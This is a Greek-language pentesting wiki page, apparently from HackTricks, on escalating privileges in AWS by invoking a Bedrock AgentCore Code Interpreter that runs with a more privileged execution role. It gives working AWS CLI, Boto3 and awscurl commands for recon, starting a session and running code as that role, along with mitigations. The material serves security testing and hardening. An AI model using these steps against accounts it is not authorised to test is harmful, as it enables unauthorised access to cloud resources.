# AWS - Bedrock PrivEsc

{{#include ../../../../banners/hacktricks-training.md}}

## Amazon Bedrock AgentCore

### `bedrock-agentcore:StartCodeInterpreterSession` + `bedrock-agentcore:InvokeCodeInterpreter` - Code Interpreter Execution-Role Pivot

Ο AgentCore Code Interpreter είναι ένα διαχειριζόμενο περιβάλλον εκτέλεσης. Οι **Custom Code Interpreters** μπορούν να διαμορφωθούν με ένα **`executionRoleArn`** που «παρέχει δικαιώματα για τον code interpreter να έχει πρόσβαση σε υπηρεσίες AWS».

Εάν ένας **lower-privileged IAM principal** μπορεί να **start + invoke** μια Code Interpreter session που είναι διαμορφωμένη με ένα **more privileged execution role**, ο καλών μπορεί ουσιαστικά να **pivot into the execution role’s permissions** (lateral movement / privilege escalation ανάλογα με το scope του ρόλου).

> [!NOTE]
> Αυτό είναι τυπικά ένα ζήτημα **misconfiguration / excessive permissions** (παραχώρηση ευρέων δικαιωμάτων στο interpreter execution role και/ή παραχώρηση ευρείας invoke πρόσβασης).
> Η AWS προειδοποιεί ρητά να αποφεύγεται το privilege escalation διασφαλίζοντας ότι τα execution roles έχουν **ίδια ή λιγότερα** προνόμια σε σχέση με τις ταυτότητες που επιτρέπεται να κάνουν invoke.

#### Προαπαιτούμενα (συνήθη misconfiguration)

- Υπάρχει ένας **custom code interpreter** με ένα υπερ-προνομιούχο **execution role** (π.χ. πρόσβαση σε ευαίσθητα S3/Secrets/SSM ή δυνατότητες τύπου IAM-admin).
- Ένας χρήστης (developer/auditor/CI identity) έχει δικαιώματα για:
  - έναρξη συνεδριών: `bedrock-agentcore:StartCodeInterpreterSession`
  - εκτέλεση εργαλείων: `bedrock-agentcore:InvokeCodeInterpreter`
- (Προαιρετικά) Ο χρήστης μπορεί επίσης να δημιουργήσει interpreters: `bedrock-agentcore:CreateCodeInterpreter` (του επιτρέπει να δημιουργήσει έναν νέο interpreter διαμορφωμένο με ένα execution role, ανάλογα με τα org guardrails).

#### Recon (identify custom interpreters and execution role usage)

Καταγράψτε τους interpreters (control-plane) και ελέγξτε τη διαμόρφωσή τους:
```bash
aws bedrock-agentcore-control list-code-interpreters
aws bedrock-agentcore-control get-code-interpreter --code-interpreter-id <CODE_INTERPRETER_ID>
````
> Η εντολή create-code-interpreter υποστηρίζει `--execution-role-arn` που καθορίζει ποια δικαιώματα AWS θα έχει ο interpreter.

#### Βήμα 1 - Ξεκινήστε μια συνεδρία (αυτό επιστρέφει ένα `sessionId`, όχι ένα interactive shell)
```bash
SESSION_ID=$(
aws bedrock-agentcore start-code-interpreter-session \
--code-interpreter-identifier <CODE_INTERPRETER_IDENTIFIER> \
--name "arte-oussama" \
--query sessionId \
--output text
)

echo "SessionId: $SESSION_ID"
```
#### Βήμα 2 - Εκτέλεση κώδικα (Boto3 ή υπογεγραμμένο HTTPS)

Δεν υπάρχει **interactive python shell** από το `start-code-interpreter-session`. Η εκτέλεση γίνεται μέσω **InvokeCodeInterpreter**.

**Επιλογή A - Boto3 παράδειγμα (execute Python + επαλήθευση ταυτότητας):**
```python
import boto3

client = boto3.client("bedrock-agentcore", region_name="<REGION>")

# Execute python inside the Code Interpreter session
resp = client.invoke_code_interpreter(
codeInterpreterIdentifier="<CODE_INTERPRETER_IDENTIFIER>",
sessionId="<SESSION_ID>",
name="executeCode",
arguments={
"language": "python",
"code": "import boto3; print(boto3.client('sts').get_caller_identity())"
}
)

# Response is streamed; print events for visibility
for event in resp.get("stream", []):
print(event)
```
Εάν ο διερμηνευτής είναι ρυθμισμένος με ρόλο εκτέλεσης, η έξοδος του `sts:GetCallerIdentity()` θα πρέπει να αντικατοπτρίζει την ταυτότητα αυτού του ρόλου (όχι του καλούντος με χαμηλά προνόμια), καταδεικνύοντας το pivot.

**Επιλογή B - Υπογεγραμμένη κλήση HTTPS (awscurl):**
```bash
awscurl -X POST \
"https://bedrock-agentcore.<Region>.amazonaws.com/code-interpreters/<CODE_INTERPRETER_IDENTIFIER>/tools/invoke" \
-H "Content-Type: application/json" \
-H "Accept: application/json" \
-H "x-amzn-code-interpreter-session-id: <SESSION_ID>" \
--service bedrock-agentcore \
--region <Region> \
-d '{
"name": "executeCode",
"arguments": {
"language": "python",
"code": "print(\"Hello from AgentCore\")"
}
}'
```
#### Επιπτώσεις

* **Lateral movement** σε οποιαδήποτε πρόσβαση AWS που έχει ο ρόλος εκτέλεσης του interpreter.
* **Privilege escalation** εάν ο ρόλος εκτέλεσης του interpreter έχει περισσότερα προνόμια από τον caller.
* Πιο δύσκολη ανίχνευση αν τα CloudTrail data events για τις κλήσεις του interpreter δεν είναι ενεργοποιημένα (οι κλήσεις ίσως δεν καταγράφονται από προεπιλογή, ανάλογα με τη διαμόρφωση).

#### Αντιμετώπιση / Σκληροποίηση

* **Least privilege** στο interpreter `executionRoleArn` (αντιμετωπίστε το όπως τα Lambda execution roles / CI roles).
* **Περιορίστε ποιος μπορεί να καλέσει** (`bedrock-agentcore:InvokeCodeInterpreter`) και ποιος μπορεί να ξεκινήσει συνεδρίες.
* Χρησιμοποιήστε **SCPs** για να απορρίψετε το InvokeCodeInterpreter εκτός από εγκεκριμένους agent runtime roles (μπορεί να απαιτηθεί εφαρμογή σε επίπεδο οργανισμού).
* Ενεργοποιήστε τα κατάλληλα **CloudTrail data events** για AgentCore όπου ισχύει· ειδοποιήστε για απροσδόκητες κλήσεις και δημιουργία συνεδριών.

## Αναφορές

- [Sonrai: AWS AgentCore privilege escalation path (SCP mitigation)](https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/)
- [Sonrai: Credential exfiltration paths in AWS code interpreters (MMDS)](https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/)
- [AWS CLI: create-code-interpreter (`--execution-role-arn`)](https://docs.aws.amazon.com/cli/latest/reference/bedrock-agentcore-control/create-code-interpreter.html)
- [AWS CLI: start-code-interpreter-session (returns `sessionId`)](https://docs.aws.amazon.com/cli/latest/reference/bedrock-agentcore/start-code-interpreter-session.html)
- [AWS Dev Guide: Code Interpreter API reference examples (Boto3 + awscurl invoke)](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/code-interpreter-api-reference-examples.html)
- [AWS Dev Guide: Security credentials management (MMDS + privilege escalation warning)](https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html)


{{#include ../../../../banners/hacktricks-training.md}}
